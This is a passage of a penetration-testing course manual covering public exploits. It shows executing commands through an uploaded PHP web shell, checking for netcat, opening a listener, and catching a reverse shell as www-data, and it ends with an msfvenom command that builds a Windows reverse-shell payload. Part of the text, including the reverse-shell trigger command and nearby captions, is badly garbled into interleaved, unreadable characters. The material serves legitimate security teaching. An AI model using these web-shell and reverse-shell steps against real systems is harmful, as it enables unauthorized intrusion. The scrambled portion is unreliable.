+The output of the exploit produces an error, but further investigation indicates it worked. The
+exploit uploaded a command shell to the projects/uploads/users/ directory. We can use curl to
+verify if we have command execution with this PHP file.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                             410
+                                                                          Penetration Testing with Kali Linux
+
+kali@kali:~$ <cu>curl http://192.168.50.11/project/uploads/users/420919-
+backdoor.php?cmd=whoami</cu>
+<pre><cr>www-data</cr>
+</pre>
+
+                             Listing 287 - The PHP script was executed by the www-data system account
+
+The whoami command returned www-data as the system user executing the PHP script. Now, we
+can enumerate more information from this web shell inside our target. The goal is to get a
+reverse shell into the machine, so let's check if nc is installed on the target.
+
+We need to modify our curl command to automatically encode our commands supplied to the
+cmd variable of our web shell. We can use the --data-urlencode option to automatically URL-
+encode our parameter.
+
+kali@kali:~$ <cu>curl http://192.168.50.11/project/uploads/users/420919-backdoor.php -
+-data-urlencode "cmd=which nc"</cu>
+<pre><cr>/usr/bin/nc</cr>
+</pre>
+
+                                                     Listing 288 - nc is installed on the target
+
+We find that nc is installed on the target machine. Let's create a netcat listener on port 6666 and
+attempt to get a reverse shell from the target to our Kali machine.
+
+kali@kali:~$ <cu>nc -lvnp 6666</cu>
+listening on [any] 6666 ...
+
+                                   Listing 289 - We have an active netcat listener running on port 6666
+
+We now have an active netcat listener in our terminal. In another terminal session, let's attempt a
+
+nk-adelatctiaa@t-kuarerlvliee:rn~sc$eod<sechue">llccumusdri=lnngchttht-epn:vw/e/119b92s2.h.1e16l68l 8.th.550a0.t .1w12a19s/p6ur6po6lj6Woehaic-dtteel/dou/wpbbliyonoa/udbsar /seuhxs"pe<lor/sict/u. 4>20919-backdoor.php -
+                                                             Jweexeefbcfusrtehydelalnudpthloe atedremdinabl yseossuior nedxopelsonito.t
+The              Listing  290 - The reverse netcat shell is                                                                              respond                                                                           to  the
+
+     reverse shell        is executed through the                                                                                        Let's switch
+
+clkn<aicoelnustc>nitaeei@tdkncia<tli/nlsctgiteou:no~>e$[nr1<9[tec2ar.num>y16]ninc8a6.l-65sl06ev.6n1sp.2s9.io6.]n6O6fSto6r-<o5f/m7in7cd5u(2>Uo1Nu9K0tNiOfWaN)co[n1n9e2c.t1io6n8.w50a.s1e1s]ta5b7l9is5h6ed from the target.
+
+<cr>uid=33(www-data) gid=33(www-data) groups=33(www-data)</cr>
+
+     Listing 291 - The netcat reverse shell successfully connected to our Kali machine
+
+The netcat reverse shell successfully connected to our Kali machine, and we are currently the
+www-data user.
+
+The idea of this section is to find the service/application and version of that service to find any
+pre-existing exploits to compromise the software. Also, we must review the exploit code prior to
+execution to avoid any malicious activity from infecting us or our employer for the penetration
+test. It is important that we gather any necessary information for the exploit usage details, such
+as the login credentials we used with our exploit.
+
+      Info
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                       411
+                                                                                                                              Penetration Testing with Kali Linux
+
+     To solve one question we need to use something that will be introduced in the material
+     later. Here is a hint on how to solve it.
+     To generate the exploit payload, use msfvenom with the following syntax:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
+
+     Where LHOST and LPORT represent the local Kali IP and port, respectively, where the
+     reverse shell will connect back. The msfvenom tool will be covered extensively in an
+     upcoming PEN-200 module.
+Let's practice what we covered in the following exercises.
+
+13.5 Wrapping up
+
+In this Module, we examined the risks associated with running code written by untrusted authors.
+We also discussed various online resources that host exploit code for publicly known
+vulnerabilities as well as offline resources that do not require an internet connection. Finally, we
+covered a scenario that shows how such online resources can be used to find public exploits for
+software versions discovered during the enumeration phase against a target.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  412
+
